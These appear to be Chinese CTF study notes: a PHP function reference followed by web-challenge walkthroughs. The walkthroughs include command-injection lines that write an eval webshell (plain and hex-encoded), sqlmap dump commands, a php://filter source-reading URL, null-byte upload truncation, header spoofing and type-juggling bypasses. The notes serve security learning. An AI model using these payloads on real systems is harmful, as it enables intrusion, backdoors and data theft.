* robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。
* 在做XSS题的时候有一个小彩蛋，只要用浏览器的控制台，输入javascript:alert(HackingLab);也可以弹出key，不知道是不是通用的，先记下来。
[XSS绕过](XSS插入绕过一些方式总结.html)。


## CTF中常见PHP特性学习笔记

### 01 extract变量覆盖
extract() 函数从数组中将变量导入到当前的符号表。语法：extract(array,extract_rules,prefix)

### PHP is_numeric() 函数

**is_numeric()** 函数用于检测变量是否为*数字*或*数字字符串*。

~~~php
bool is_numeric ( mixed $var )
//如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。
~~~

### PHP 超级全局变量

* `$GLOBALS` 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。

  `$GLOBALS`是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

*  `$_SERVER` 是一个包含了诸如头信息（`header`）、路径（`path`）、以及脚本位置（`script locations`）等等信息的数组。

  下表列出了所有`$_SERVER`变量中的重要元素：

  | 元素/代码                       | 描述                                                         |
  | ------------------------------- | :----------------------------------------------------------- |
  | $_SERVER['PHP_SELF']            | 当前执行脚本的文件名，与 document root 有关。例如，在地址为  http://example.com/test.php/foo.bar 的脚本中使用 $_SERVER['PHP_SELF'] 将得到  /test.php/foo.bar。__FILE__ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果  PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 |
  | $_SERVER['GATEWAY_INTERFACE']   | 服务器使用的 CGI 规范的版本；例如，"CGI/1.1"。               |
  | $_SERVER['SERVER_ADDR']         | 当前运行脚本所在的服务器的 IP 地址。                         |
  | $_SERVER['SERVER_NAME']         | 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: www.runoob.com) |
  | $_SERVER['SERVER_SOFTWARE']     | 服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24) |
  | $_SERVER['SERVER_PROTOCOL']     | 请求页面时通信协议的名称和版本。例如，"HTTP/1.0"。           |
  | $_SERVER['REQUEST_METHOD']      | 访问页面使用的请求方法；例如，"GET", "HEAD"，"POST"，"PUT"。 |
  | $_SERVER['REQUEST_TIME']        | 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)   |
  | $_SERVER['QUERY_STRING']        | query string（查询字符串），如果有的话，通过它进行页面访问。 |
  | $_SERVER['HTTP_ACCEPT']         | 当前请求头中 Accept: 项的内容，如果存在的话。                |
  | $_SERVER['HTTP_ACCEPT_CHARSET'] | 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如："iso-8859-1,*,utf-8"。 |
  | $_SERVER['HTTP_HOST']           | 当前请求头中 Host: 项的内容，如果存在的话。                  |
  | $_SERVER['HTTP_REFERER']        | 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。) |
  | $_SERVER['HTTPS']               | 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。      |
  | $_SERVER['REMOTE_ADDR']         | 浏览当前页面的用户的 IP 地址。                               |
  | $_SERVER['REMOTE_HOST']         | 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。 |
  | $_SERVER['REMOTE_PORT']         | 用户机器上连接到 Web 服务器所使用的端口号。                  |
  | $_SERVER['SCRIPT_FILENAME']     | 当前执行脚本的绝对路径。                                     |
  | $_SERVER['SERVER_ADMIN']        | 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：someone@runoob.com) |
  | $_SERVER['SERVER_PORT']         | Web 服务器使用的端口。默认值为 "80"。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。 |
  | $_SERVER['SERVER_SIGNATURE']    | 包含了服务器版本和虚拟主机名的字符串。                       |
  | $_SERVER['PATH_TRANSLATED']     | 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 |
  | $_SERVER['SCRIPT_NAME']         | 包含当前脚本的路径。这在页面需要指向自己时非常有用。\__FILE__ 常量包含当前脚本(例如包含文件)的完整路径和文件名。 |
  | $_SERVER['SCRIPT_URI']          | URI 用来指定要访问的页面。例如 "/index.html"。               |

* `$_REQUEST` 用于收集HTML表单提交的数据。

* `$_POST` 被广泛应用于收集表单数据，在*HTML form*标签的指定该属性：`method=”post“`

* `$_GET` 同样被广泛应用于收集表单数据，在*HTML form*标签的指定该属性：`method="get"`。

* `$_FILES` [用于文件就收的处理img 最常见]

* `$_COOKIE` [用于获取与`setCookie()`中的`name` 值]

* `$_SESSION` [用于存储`session`的值或获取`session`中的值]

* `$_ENV` [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]

### X-Forwarded-For

`X-Forwarded-For`:简称`XFF头`，它代表客户端，也就是`HTTP`的请求端`真实的IP`，只有在通过了`HTTP` 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。

~~~php
标准格式如下：
X-Forwarded-For: client1, proxy1, proxy2
从标准格式可以看出，X-Forwarded-For头信息可以有多个，中间用逗号分隔，第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个。
~~~

### php://filter

bugku  flag在index里（http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php）

​     `php://filter` 是一种元封装器，     设计用于数据流打开时的[筛选过滤](https://www.php.net/manual/zh/filters.php)应用。     这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile()](https://www.php.net/manual/zh/function.readfile.php)、     [file()](https://www.php.net/manual/zh/function.file.php) 和 [file_get_contents()](https://www.php.net/manual/zh/function.file-get-contents.php)，     在数据流内容读取之前没有机会应用其他过滤器。    

​     `php://filter` 目标使用以下的参数作为它路径的一部分。     复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。    

​     

| 名称                        | 描述                                                         |
| --------------------------- | :----------------------------------------------------------- |
| *resource=<要过滤的数据流>* | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |
| *read=<读链的筛选列表>*     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\|*）分隔。 |
| *write=<写链的筛选列表>*    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（*\|*）分隔。 |
| *<；两个链的筛选列表>*      | 任何没有以 *read=* 或 *write=* 作前缀          的筛选器列表会视情况应用于读或写链。 |

~~~php

<?php
/* 这会以大写字母输出 www.example.com 的全部内容 */
readfile("php://filter/read=string.toupper/resource=http://www.example.com");

/* 这会和以上所做的一样，但还会用 ROT13 加密。 */
readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");
?>

~~~

---

### ini_set()函数

```php
ini_set("display_errors","0");
```

设置错误报告等级，不显示错误报告

---

### set_time_limit（）函数

```php
set_time_limit(0);
```

设置脚本最大执行时间，单位为秒，如果设置为0（零），没有时间方面的限制。

---

### set_magic_quotes_runtime（）函数

```php
set_magic_quotes_runtime(0)
```

set_magic_quotes_runtime 用来设置php.ini文件中的magic_quotes_runtime值，当遇到反斜杆（\）、单引号（'）、双引号（"）这样一些的字符定入到数据库里，又不想被过滤掉，使用这个函数，将会自动加上一个反斜杆（\），保护系统和数据库的安全。

magic_quotes_runtime 是php.ini里的环境配置变量，0和false表示关闭本功能,1和true表示打开本功能。

---

### base64_decode()

解码base64

---

### str_replace()

```php
str_replace("\r","",$c);
```

将变量c中的回车符替换为空

该函数必须遵循下列规则：

- 如果搜索的字符串是数组，那么它将返回数组。
- 如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。
- 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换
- 如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。

注释：该函数区分大小写。请使用 `str_ireplace()` 函数执行不区分大小写的搜索。

---

### strrev()

反转字符串

---

### stripslashes

反引用一个引用字符串

#### 原型

~~~php
stripslashes ( string $str ) : string
~~~

#### 返回值

返回一个去除转义反斜线后的字符串（*\\'* 转换为 *'* 等等）。双反斜线（*\\\\*）被转换为单个反斜线（*\\*）。

---

### substr() 

substr() 函数返回字符串的一部分

```php
substr(string,start,length)
```

---

### fnmatch

用模式匹配文件名

#### 原型

~~~php
fnmatch ( string $pattern , string $string [, int $flags = 0 ] ) : bool
~~~

**fnmatch()** 检查传入的 `string` 是否匹配给出的 shell 统配符 `pattern`。

匹配则返回 **TRUE**，否则返回 **FALSE**。

---

### shell_exec

通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。

#### 原型

~~~php
 shell_exec ( string $cmd ) : string
~~~

windows下连接命令的符号：**&&、&、|、||**命令拼接符号的区别

- A&B  简单的拼接，AB之间无制约关系
- A&&B   A执行成功，然后才会执行B
- A|B  A的输出，作为B的输入
- A||B  A执行失败，然后才会执行B

windows下命令注入写webshell：

用^转义<

~~~php
echo ^<?php eval($_POST[pass]); ?^> > web目录shell.php
~~~

如果加上单引号会写不进去，如果加双引号会把双引号一起写进去，所以要用^转义<

~~~php
echo '<?php eval($_POST[pass]); ?>' > web目录shell.php
~~~

linux下命令注入写webshell：

linux下需要用单引号来转义<，不过很多php都默认开启gpc，可以先用16进制转换一句话再用xxd命令把16进制还原.

~~~php
echo '<?php eval($_POST[pass]);>' > web目录/shell.php
~~~

~~~php
echo 3c3f706870206576616c28245f504f53545b706173735d293b3e|xxd -r -ps > web目录/shell.php
~~~



---



### fwrite()

fwrite() 函数写入文件，fwrite() 把 *string* 的内容写入文件指针 *file* 处。 如果指定了 *length*，当写入了 *length* 个字节或者写完了 *string* 以后，写入就会停止，视乎先碰到哪种情况。

```php
fwrite(file,string,length)
```

---

### ignore_user_abort() 

设置与客户机断开是否会终止脚本的执行。

如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行。

如果未设置该参数，会返回当前的设置。

---

### unlink（）

删除文件。

如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。

---

### \_\_FILE\_\_

取得当前文件的绝对地址，结果：D:\www\test.php 

---

### file_put_contents()

 将一个字符串写入文件

~~~php
 file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int
~~~

---

### file_get_contents()

把整个文件读入一个字符串中

#### 原型

~~~php
 file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] ) : string
~~~

---

### trim()

去除字符串首尾处的空白字符（或者其他字符）

#### 原型

~~~php
 trim ( string $str [, string $character_mask = " \t\n\r\0\x0B" ] ) : string
~~~



---



### PHP 暂停函数 sleep() 与 usleep() 的区别

在PHP中暂停代码执行一定时间，有两个函数可以实现，一个是`sleep()`，另一个是`usleep()`，它们参数都是一个整数值。sleep()是暂停**多少秒**，usleep()是暂停**多少微秒**。

**注意：**usleep()单位是微秒，1秒 = 1000毫秒 ，1毫秒 = 1000微秒，即1微秒等于百万分之一秒。

---

### extract()

从数组中将变量导入到当前的符号表

#### 原型

~~~php
 extract ( array &$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) : int
~~~

#### 参数

-  `array`

    一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量，并受到    `flags` 和 `prefix` 参数的影响。                       必须使用关联数组，数字索引的数组将不会产生结果，除非用了    **EXTR_PREFIX_ALL** 或者 **EXTR_PREFIX_INVALID**。             

-  `flags`

  对待非法／数字和冲突的键名的方法将根据取出标记    `flags` 参数决定。可以是以下值之一

  **EXTR_OVERWRITE**       如果有冲突，覆盖已有的变量。                                                   **EXTR_SKIP**      如果有冲突，不覆盖已有的变量。                                                   **EXTR_PREFIX_SAME**  如果有冲突，在变量名前加上前缀 `prefix`。                                                   **EXTR_PREFIX_ALL**   给所有变量名加上前缀        `prefix`。                                                   **EXTR_PREFIX_INVALID**  仅在非法／数字的变量名前加上前缀 `prefix`。                                                   

  **EXTR_IF_EXISTS**      仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。举个例子，以下情况非常有用：定义一些有效变量，然后从 [$_REQUEST](https://www.php.net/manual/zh/reserved.variables.request.php) 中仅导入这些已定义的变量。                                                   

  **EXTR_PREFIX_IF_EXISTS**        仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。                                                   

  **EXTR_REFS**  将变量作为引用提取。这有力地表明了导入的变量仍然引用了        `array` 参数的值。可以单独使用这个标志或者在  `flags` 中用 OR 与其它任何标志结合使用。

  如果没有指定 `flags`，则被假定为 **EXTR_OVERWRITE**。             

-  `prefix`

   注意 `prefix` 仅在    `flags` 的值是    **EXTR_PREFIX_SAME**，**EXTR_PREFIX_ALL**，**EXTR_PREFIX_INVALID**    或 **EXTR_PREFIX_IF_EXISTS**    时需要。        

  如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。

---

### strpos()

 用于检索字符串内指定的字符或文本。找到，则返回首个匹配的字符位置。如果未找到匹配，则返回false。

#### 实例

查找“php”在字符串第一次出现的位置：

~~~php
<?php
echo strpos("You love php, I love php too!","php");
?>
~~~

ereg函数**存在NULL截断漏洞**，导致了正则过滤被绕过,所以**可以使用%00截断**正则匹配

---

### strrpos

计算指定字符串在目标字符串中最后一次出现的位置

#### 原型

~~~php
strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) : int
~~~

返回字符串 `haystack` 中 `needle` 最后一次出现的数字位置。

---

### stristr() 

stristr() 函数搜索字符串在另一字符串中的第一次出现。

#### 语法

~~~php
stristr(string,search,before_search)
~~~

#### 参数

- string 必需。规定被搜索的字符串。
- search 必需。规定要搜索的字符串。**如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。**
- *before_search* 可选。默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 *search* 参数第一次出现之前的字符串部分。

#### 实例

查找 "world" 在 "Hello world!" 中的第一次出现，并返回字符串的剩余部分：

~~~php
<?php
echo stristr("Hello world!","WORLD");
?>
world! 
~~~

---

### PHP常量

如需设置常量，请使用`define()`函数 - 它使用三个参数：

1. 首个参数定义常量的名称
2. 第二个参数定义常量的值
3. 可选的第三个参数规定常量名是否对大小写不敏感。默认是fasle，false表示大小写敏感。

下例创建了一个*对大小写敏感的常量*，值为 "Welcome to W3School.com.cn!"：

~~~php
<?php
define("GREETING", "Welcome to W3School.com.cn!");
echo GREETING;
?>
~~~

---

### include

- 服务器端包含 (SSI) 用于创建可在多个页面重复使用的函数、页眉、页脚或元素。
- include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。
- `include`与`require`的区别：
  - require **会生成致命错误**（E_COMPILE_ERROR）并停止脚本
  - include **只生成警告**（E_WARNING），并且脚本会继续

---

### $_FILES

HTTP 文件上传变量,通过 HTTP POST 方式上传到当前脚本的项目的数组。

-  [$_FILES['userfile'\]['name']](https://www.php.net/manual/zh/reserved.variables.files.php)

  ​                客户端机器文件的原名称。             

-  [$_FILES['userfile'\]['type']](https://www.php.net/manual/zh/reserved.variables.files.php)

  ​                文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“*image/gif*”。不过此        MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。              

-  [$_FILES['userfile'\]['size']](https://www.php.net/manual/zh/reserved.variables.files.php)

  ​                已上传文件的大小，单位为字节。             

-  [$_FILES['userfile'\]['tmp_name']](https://www.php.net/manual/zh/reserved.variables.files.php)

  ​                文件被上传后在服务端储存的临时文件名。             

-  [$_FILES['userfile'\]['error']](https://www.php.net/manual/zh/reserved.variables.files.php)

  ​                和该文件上传相关的[错误代码](https://www.php.net/manual/zh/features.file-upload.errors.php)。此项目是在        PHP 4.2.0 版本中增加的。             

---

### move_uploaded_file

 将上传的文件移动到新位置

#### 原型

~~~php
 move_uploaded_file ( string $filename , string $destination ) : bool
~~~

本函数检查并确保由 `filename`指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST上传机制所上传的）。如果文件合法，则将其移动为由`destination` 指定的文件。

---

### 操作文件

- readfile()函数 读取文件，并把它写入输出缓冲

- fopen()函数 打开文件

- fread()和上面的函数一样，会以一种模式（r，w，a，x，r+，w+，a＋，x＋）来执行后续的动作。

- fclose 关闭文件

- fgets() 读取单行文件

- feof() 检测是否到达文件末尾

- fgets()读取单个字符

- fwrite()写入文件

- 上传脚本

  创建上传脚本

  “upload_file.php”文件含有供上传文件的代码：

  ~~~php
  <?php
      if ($_FILES["file"]["error"] > 0)
      {
          echo "Error: " . $_FILES["file"]["error"] . "<br />";
      }
  	else
      {
           echo "Upload: " . $_FILES["file"]["name"] . "<br />";
           echo "Type: " . $_FILES["file"]["type"] . "<br />";
           echo "Size: " . ($_FILES["file"]["size"] / 1024) . "Kb<br />";
           echo "Stored in:" . $_FILES["file"]["tmp_name"];
      }
  ?>
  ~~~

  通过使用PHP的全局数组$_FILES,你可以从客户计算机向远程服务器上传文件。

  第一个参数是表单的input name，第二个下标可以是“name”，“type”，“size”，“tmp_name”或“error”。就像这样：

  - $_FILES["file"]["name"] - 被上传文件的名称
  - $_FILES["file"]["type"] - 被上传文件的类型
  - $_FILES["file"]["size"] - 被上传文件的大小，以字节计
  - $_FILES["file"]["tmp_name"] - 存储在服务器的文件的临时副本的名称
  - $_FILES["file"]["error"] - 由文件上传导致的错误代码

这是一种非常简单文件上传方式。基于安全方面的考虑，您应当增加有关什么用户有权上传文件的限制。

---

### Cookie用于识别用户

- setcookie() 函数用于设置 cookie。

  注释：setcookie() 函数必须位于 <html> 标签之前。 语法

  setcookie(name, value, expire, path, domain);

- $_COOKIE 变量用于取回cookie值

---

### Session

- session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。

- session_start() 函数必须位于 <html> 标签之前：

  ~~~php
    <?php session_start(); ?>
    <html>
    <body>
    </body>
    </html>
  ~~~

- 存储Session变量－使用 PHP $_SESSION 变量。

- 终结Session 如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。

  unset() 函数用于释放指定的 session 变量

  您也可以通过 session_destroy() 函数彻底终结 session

---

### 过滤器

- filter_var() - 通过一个指定的过滤器来过滤单一的变量

- filter_var_array() - 通过相同的或不同的过滤器来过滤多个变量

- filter_input - 获取一个输入变量，并对它进行过滤

- filter_input_array - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤

- Validating 和 Sanitizing

  有两种过滤器：

  Validating 过滤器：

  用于验证用户输入

  严格的格式规则（比如 URL 或 E-Mail 验证）

  如果成功则返回预期的类型，如果失败则返回 FALSE

  Sanitizing 过滤器：

  用于允许或禁止字符串中指定的字符

  无数据格式规则

  始终返回字符串

---

### php_uname

返回运行 PHP 的系统的有关信息

#### 原型

~~~php
 php_uname ([ string $mode = "a" ] ) : string
~~~

**php_uname()** 返回了运行 PHP 的操作系统的描述。这和 [phpinfo()](https://www.php.net/manual/zh/function.phpinfo.php) 最顶端上输出的是同一个字符串。

#### 参数

​        `mode` 是单个字符，用于定义要返回什么信息：        

- *'a'*：此为默认。包含序列 *"s n r v m"* 里的所有模式。                   
-  *'s'*：操作系统名称。例如：            *FreeBSD*。                   
- *'n'*：主机名。例如：           *localhost.example.com*。                   
- *'r'*：版本名称，例如：           *5.1.2-RELEASE*。                   
-  *'v'*：版本信息。操作系统之间有很大的不同。                   
-  *'m'*：机器类型。例如：*i386*。              

---

### basename

返回路径中的文件名部分。

#### 原型

~~~php
 basename ( string $path [, string $suffix ] ) : string
~~~

给出一个包含有指向一个文件的全路径的字符串，本函数返回基本的文件名。

如果文件名是以`suffix` 结束的，那这一部分也会被去掉。

---

### ereg()

正则表达式匹配

#### 原型

~~~php
 ereg ( string $pattern , string $string [, array &$regs ] ) : int
~~~

以区分大小写的方式在 `string`中寻找与给定的正则表达式 `pattern` 所匹配的子串。

如果找到与 `pattern`中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数
`regs`，则匹配项将被存入`regs` 数组中。$regs[1]包含第一个左圆括号开始的子串，$regs[2]
包含第二个子串，以此类推。$regs[0] 包含整个匹配的字符串。

---

### preg_replace

执行一个正则表达式的搜索和替换

~~~php
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed
~~~

搜索**subject**中匹配**pattern**的部分， 以**replacement**进行替换。

---



## 猫抓老鼠

1. 打开是一个简单的表单，![如图](.\WEB\猫抓老鼠\1.png),尝试输入admin，得到结果“Check Failed”，也就是说应该输入正确的内容得到答案，用burp suite抓包，右键，将信息发送到Repeater，点击go，可以看到响应头信息，![如图](.\WEB\猫抓老鼠\2.png),在响应头信息中可以看到一行Content-Row的信息，这条不是标准信息，尝试将这个信息内容复制到pass_key，得到最终答案。

## 头有点大

1. 题目给了三条提示信息，You don't have permission to access / on this server.

Please make sure you have installed .net framework 9.9!

Make sure you are in the region of England and browsing this site with Internet Explorer。
根据题目意思应该是需要满足三个条件，第一个是安装.net9.9框架，第二个是保证在英国地区，第三个是用ie浏览器。第一个和第三个可以在User-Agent后面加上(MSIE 9.0;.NET CLR 9.9)来实现，第二个条件在英国我们把语言改成en-gb即可。

## 貌似有点难

1. 打开网址，有一个按钮，点开它，显示![如图](WEB\貌似有点难\1.png)。这是一个PHP代码审计题。可以看到![有一段代码](WEB\貌似有点难\2.png)。如果IP=1.1.1.1，则输出key否则输出错误！现在我们的页面是报错了，说明我们现在的IP不是1.1.1.1，我们要把它改成1.1.1.1，通过Burpsuite抓包拦截，![如图](WEB\貌似有点难\3.png),修改它的头部IP，也就是修改成为1.1.1.1，用到Client-IP: 1.1.1.1命令，点击Go,得到![flag](WEB\貌似有点难\4.png)
* Client-IP 是代理服务器发送的HTTP头，通过客户端伪造Client-IP，可以欺骗此程序，达到“伪造 IP ”的目的

## 这个看起来有点简单

1. 手工检测是否存在sql注入（经典id=1'加入单引号提交,结果:如果出现错误提示，则该网站可能就存在注入漏洞），使用sqlmap爆出当前数据，
python sqlmap.py -u http://ctf5.shiyanbar.com/8/index.php?id=1 --dbs，
得到![结果](WEB\这个看起来有点简单\1.png)，可以看到里面有三个数据库，其中information_schema是MySQL自带的数据库，不考虑，很明显test数据库是一个测试数据库，也不是我们所要的，那么就剩下一个了。
2. sqlmap -u http://ctf5.shiyanbar.com/8/index.php?id=1 -D my_db --tables，爆出列表，![如图](WEB\这个看起来有点简单\2.png)
3. sqlmap -u http://ctf5.shiyanbar.com/8/index.php?id=1 -D my_db -T thiskey --columns,爆列字段，![如图](WEB\这个看起来有点简单\3.png)
4. sqlmap -u http://ctf5.shiyanbar.com/8/index.php?id=1 -D my_db -T thiskey -C k0y --dump，得到flag。![如图](WEB\这个看起来有点简单\4.png)

## PHP大法

1. 打开链接后，如图![](WEB\PHP大法\1.png)，里面提示有一个txt文件，打开这个txt文件，里面是一段php代码![](WEB\PHP大法\2.png)。根据代码可以知道需要传入一个参数id，id的值不能是hackerDJ，但经过URL解码后应该是hackerDJ，这里要注意，在平常中我们应该会注意到浏览器会默认的进行一次URL解码，所以这里要对"hackerDJ"进行两次编码。
2. 构造payload -> ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41。然后就能得到结果了![](WEB\PHP大法\3.png).这里用到的工具是御剑1.5，别的工具进行url编码时没有效果，原因不知道。
* 字符串比对解析，与大小写无关。
  eregi()函数
  语法:  eregi(string pattern, string string, array [regs]);
  返回值: 整数/数组
  特点：PHP函数eregi()与大小写无关，类似函数ereg() 则区分大小写
  例：if (eregi("C","abcdef") 　　//true
  URl双编码： 将经过url编码产生的'%'再次编码，及把'%'替换为'%25'

## what a fuck!这是什么鬼东西?

* jother编码：jother是一种运用于javascript语言中利用少数字符构造精简的匿名函数方法对于字符串进行的编码方式。
其中少量字符包括：“!”，“+”，“(”，“)”，“[”，“]”，“{”，“}”。只用这些字符就能完成对 任意字符串的编码。
1. 打开连接，满屏幕的[][(![]+[])[+[]]+([![]]+[][[]这种符号，查了一下，这个就jother编码，将代码复制到控制台运行一下，直接弹出flag。

## 上传绕过

1. 点开连接，让上传文件，没有其他提示，随意上传一个txt文件，提交后给出提示![](WEB\上传绕过\1.png)，将文件后缀改成jpg，又提示后缀名为php文件才行，![](WEB\上传绕过\2.png)，很明显，题意为卡住php后缀，逼迫你上传文件后缀为jpg等类型，典型的上传绕过问题，一般按照思路逐步尝试即可，简单的大小写，加后缀不可过，此题无js，猜测为0x00截断上传。一般常见的上传漏洞就是截断了，是0x00数据会截断后续数据，当数据为abc.php0x001.jpg时，服务器会处理为abc.php，而0x00后的数据会忽略（产生原因magic_quotes_gpc未打开，同时相关数据没有进行处理）。
2. 用burpsuite抓包，上传一个test.php.jpg文件，将php后面的点修改为00，![](WEB\上传绕过\3.png)，提交就能得到flag了。![](WEB\上传绕过\4.png)

## FALSE
* PHP函数isset()： 检测变量是否设置
* die()函数　 :  停止程序运行，输出内容
* sha1()函数： 计算字符串 "Hello" 的 SHA-1 散列。默认的传入参数类型是字符串型

1. 这道题给了源码，![](WEB\FASLE\1.png)可以知道登录成功条件： （1）传入name,password的值（2）name和password的值不能相等（3)  name和password的sha1加密散列值相等。
2. sha1()函数默认的传入参数类型是字符串型，可以传入其他类型，使其返回值为false。如数组类型。构造url:  http://ctf4.shiyanbar.com/web/false.php?name[]=a&password[]=b (a,b只要不等即可)，提交即可获得flag

## Guess Next Session

1. 又是一道PHP代码审计题，![](WEB\Guess_Next_Session\1.png)
2. 观察代码，在代码中并没有什么函数，关键就在于：password = $_session['password']。问题到了这一步，让我们把这放下，先来分析一下PHP中的Session和Cookie。

   Cookie与 Session，一般都会认为这是两个独立完全不同的东西，Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案。在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了。
3. 先用Burp Suite进行抓包：![](WEB\Guess_Next_Session\2.png)从抓包的内容中我们就能看见在Cookie中已经是包含了Sessid，并且发送的password在URL中以Get的方式传值。

那这里我们就可以以这样的思路来求解。首先我们删除所有的Cookie，将PHPSessid值直接删掉，这样的结果就会使得$_session['password']值为空，接下来我们将URL中的password值清空，这样我们就能达到password = $_session['password']的效果。

右键，发送到Repeater，删掉Cookie和password，点击go就能得到我们的结果：![](WEB\Guess_Next_Session\3.png)

## Once More

1. 有提示：1.利用ereg()漏洞%00截断     2.利用科学计算法
查看源码![](WEB\Once_More\1.png)
2. 分析：
    1.ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE
    ===类型恒等于
    == 和 != 比较若类型不同，先偿试转换类型，再作值比较，最后返回值比较结果 。
    而 === 和 !== 只有在相同类型下,才会比较其值。

  定义：返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次
  意思：只能输入字符和数字

  2.strlen($_GET['password']) < 8 && $_GET['password'] > 9999999
  意思：字符串长度小于8，值大于9999999，

  3.strpos ($_GET['password'], '*-*') !== FALSE
  定义：strpos — 查找字符串首次出现的位置
  意思：*-*要出现

  4.原因：%00算一个字符，，，，，，
  填入1e8%00*-*（可以）1e8 表示1*10的8次方
  填入1e9%00*-*（可以）
  填入1e10%00*-*（不行）字符串长度等于8了

  5.在地址栏输入
  自己尝试，不然把%00解析为%2500，因为%===》%25

  ## 忘记密码了

  1. 首先随便提交一个字符串，得到返回信息，![](WEB\忘记密码了\1.png)存在一个step2.php页面，打开看看![](WEB\忘记密码了\2.png)，里面发现了submit.php页面，再打开![](WEB\忘记密码了\3.png)提示you are not an admin，看来突破点应该是在这里。

    虽说找到了突破点，但是没有后台代码的话，还是做不出来的。这时候就要注意一下step1和step2两个php，有没有什么有用的信息？![](WEB\忘记密码了\1.png)
    它告诉了我们编辑器是Vim，而这个编辑器在对某个文件编辑后，如果非正常退出，会产生一个该文件的临时文件，名字为.原文件名.swp。（还有一种获取源码的方式是其备份文件名：原文件名~）
  2. 访问http://ctf5.shiyanbar.com/10/upload/.submit.php.swp，得到![](WEB\忘记密码了\4.png)需要两个条件，emailAddress和token

  emailAddress应该是admin的邮箱地址，我们可以在step那两个php的源码里看到，应该为admin@simplexue.com

  token的要求为长度为10并且值为0，0e满足这个条件
  构造url：http://ctf5.shiyanbar.com/10/upload/submit.php?token=0e11111111&emailAddress=admin@simplexue.com，可以得到falg

## 天网管理系统

1. 用burpsuite抓包，提交一下，得到![](WEB\天网管理系统\1.png)要求用户名传入一个字符串，经过md5加密后要等于0。
2. 插播一段有关于 `PHP弱类型`的相关知识
    在php中

  == :　 比较运算符号  不会检查条件式的表达式的类型

  ===:  恒等计算符 , 同时检查表达式的值与类型。（会检查表达式类型，如bool）

  比如：

  * **当php进行一些数学计算的时候，当有一个对比参数是整数的时候,会把另外一个参数强制转换为整数**。

  1 var_dump(0 == '0'); // true
  2 var_dump(0 == 'abcdefg'); // true 
  3 var_dump(0 === 'abcdefg'); // false
  4 var_dump(1 == '1abcdef'); // true

  * bool类型的true跟任意字符串可以弱类型相等

  PHP会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。

  在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，

  ~~~php
<?php
var_dump("admin"==0);  //true
var_dump("1admin"==1); //true
var_dump("admin1"==1) //false
var_dump("admin1"==0) //true
